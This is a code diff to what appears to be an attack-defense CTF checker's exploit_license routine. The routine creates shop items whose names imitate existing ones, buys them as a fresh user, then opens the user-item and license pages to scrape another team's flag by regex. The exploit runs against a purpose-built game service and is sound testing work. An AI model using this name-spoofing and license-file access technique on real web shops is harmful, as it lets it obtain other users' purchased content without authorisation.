@@ -208,9 +208,10 @@ async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: Chain
         raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
     
     orig_name = re.findall(regex_item_name,response.text)
+    fake_names = []
     for o in orig_name:
         item_name = await make_item_name_exploitable(item_name=o )
-
+        fake_names.append(item_name)
         shop_item_kwargs =  {
             'data_path': '/frog.png',
             'item_name': item_name,
@@ -225,41 +226,50 @@ async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: Chain
             'description': 'This is exploitable',
         }
         await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
-        await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
-        user = await register_user(client=client,logger=None,db=db,chain_id=None)
+    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
+    user = await register_user(client=client,logger=None,db=db,chain_id=None)
+    for f in fake_names:
         try:
             response = await client.get('shop/',follow_redirects=True)
         except ResponseError:
             raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
-        
-        item_id=((response.text.split(item_name)[1]).split('<a href="')[1]).split('"')[0]
+
+        item_id=((response.text.split(f)[1]).split('<a href="')[1]).split('"')[0]
 
         try:
             response = await client.get(f'shop/purchase/{item_id}',follow_redirects=True)
         except ResponseError:
             raise MumbleException(f"EXPLOIT_LICENSE - Error while purchasing item with id {item_id}")
 
+    for o in orig_name:
         try:
             response = await client.get(f'user_items/',follow_redirects=True)
         except ResponseError:
-            raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}") 
+            raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting user items!") 
 
+        item_id=((response.text.split(o)[1]).split('<a href="')[1]).split('"')[0]
+        
+        
         try:
             response = await client.get(f'user_items/{item_id}',follow_redirects=True)
         except ResponseError:
             raise MumbleException(f"EXPLOIT_LICENSE - Error while viewing item with id {item_id}") 
-        
+
         license_url = re.findall(regex_license,response.text)[0]
-        
         try:
             response = await client.get(f"{license_url}",follow_redirects=True)
         except RequestError:
             raise MumbleException(f"Error while viewing license of user item with id: {item_id}")
-
-
         match = re.findall(searcher._flag_re.pattern.decode('utf-8'),response.text)
-        if match[0]:
-            return match[0]
+        flag = searcher.search_flag(response.text)
+        try:
+            
+            if flag:
+                return flag
+        except:
+            
+            if match[0]:
+                return match[0]
 
     raise MumbleException("Could not find flag in license_file")  
 
